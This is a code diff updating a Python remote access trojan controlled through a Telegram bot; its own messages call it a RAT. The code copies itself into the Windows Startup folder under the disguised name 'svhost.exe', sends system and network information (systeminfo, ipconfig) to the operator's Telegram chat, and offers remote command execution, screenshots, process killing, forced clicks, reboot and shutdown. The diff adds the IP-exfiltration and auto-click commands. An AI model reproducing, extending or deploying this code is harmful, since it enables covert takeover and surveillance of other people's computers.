@@ -1,7 +1,7 @@
 import sys
 import telebot
 import io
-from telebot import types
+from telebot import *
 import os
 import pyautogui as pg
 from pyautogui import *
@@ -12,16 +12,39 @@ import random
 import shutil
 import webbrowser
 import mouse
+from telebot.types import BotCommand
 from urllib3.util import url
 
-token='' #Bot token
+token='' #TOKEN BOT
 
 bot=telebot.TeleBot(token, parse_mode=None)
 
-id=0 #Chat id
+id=0 #ID CHAT
 
 us=os.path.join(os.path.expanduser('~'), 'S1eepTeam')
 pw=os.makedirs(us, exist_ok=True)
+
+commandsTw=[
+    BotCommand('start', description='Начать'),
+    BotCommand('info', description='Информация пк'),
+    BotCommand('ip', 'Информация об айпи'),
+    BotCommand('sc', description='Показать экран'),
+    BotCommand('scs', description='Показывать экран'),
+    BotCommand('ms', description='Показать сообщение на экране'),
+    BotCommand('protas', description='Лист процессов'),
+    BotCommand('cd', description='Директории'),
+    BotCommand('cmd', description='Выполнение команд'),
+    BotCommand('click', description='Авто клики'),
+    BotCommand('site', description='Открыть ссылку'),
+    BotCommand('open', description='Открыть программу'),
+    BotCommand('kill', description='Закрыть программу'),
+    BotCommand('alt', description='Alt + F4'),
+    BotCommand('porn', description='PornHub'),
+    BotCommand('dance', description='Танцы окон'),
+    BotCommand('rep', description='Перезагрузить пк'),
+    BotCommand('ofp', description='Выключить пк')
+]
+
 
 def run_cmd(command):
     try:
@@ -37,7 +60,7 @@ def st():
         stra=os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start menu', 'Programs', 'Startup')
         iot=os.path.join(stra, os.path.basename(osnova))
         shutil.copy2(osnova, iot)
-        os.rename(os.path.join(stra, 'SnosByS1eep.exe'), os.path.join(stra, 'svhost.exe'))
+        os.rename(os.path.join(stra, 'SnosByS1eepV2.exe'), os.path.join(stra, 'svhost.exe'))
         bot.send_message(chat_id=id, text='Ратка была добавлена в авто загрузку')
         r2dwa = random.randint(111111, 999999)
         output = run_cmd('systeminfo')
@@ -59,14 +82,17 @@ st()
 
 @bot.message_handler(commands=['start'])
 def start(message):
+    bot.set_my_commands(commandsTw)
     bot.send_message(chat_id=id, text='''/start - Начать
 /info - Информация пк
+/ip - Информация об айпи
 /sc - Показать экран
 /scs - Показывать экран
 /ms - Показать сообщение на экране
 /protas - Лист процессов
 /cd - Директории
 /cmd - Выполнение команд
+/click - Авто клики
 /site - Открыть ссылку
 /open - Открыть программу
 /kill - Закрыть программу
@@ -251,6 +277,32 @@ def cmd(message):
         os.remove(os.path.join(us, f'FileCmd{r2}.txt'))
     else:
         bot.send_message(chat_id=id, text='Напишите команду после /cmd')
+
+@bot.message_handler(commands=['ip'])
+def ip(message):
+    r2 = random.randint(111111, 999999)
+    bot.send_message(chat_id=id, text='Айпи был записан, держите:')
+    with io.open(os.path.join(us, f'IP{r2}.txt'), 'a', encoding='utf8') as f:
+        f.write(f'{subprocess.run(['ipconfig'], capture_output=True,text=True,shell=True, encoding='cp866')}')
+
+    with io.open(os.path.join(us, f'IP{r2}.txt'), 'r', encoding='utf8') as cw:
+        bot.send_document(chat_id=id, document=cw)
+
+    t.sleep(0.1)
+
+    os.remove(os.path.join(us, f'IP{r2}.txt'))
+
+@bot.message_handler(commands=['click'])
+def click(message):
+    wer=message.text.split(' ', 1)
+    if len(wer) > 1:
+        ckic=wer[1]
+        bot.send_message(chat_id=id, text=f'Атака кликова началась, кол-во кликов ({ckic})')
+        for i in range(0, int(ckic)):
+            pg.leftClick()
+        bot.send_message(chat_id=id, text='Атака кликов была завершена!')
+    else:
+        bot.send_message(chat_id=id, text='После /click напишите кол-во повторений')
 
 @bot.message_handler(content_types=['text'])
 def text(message):
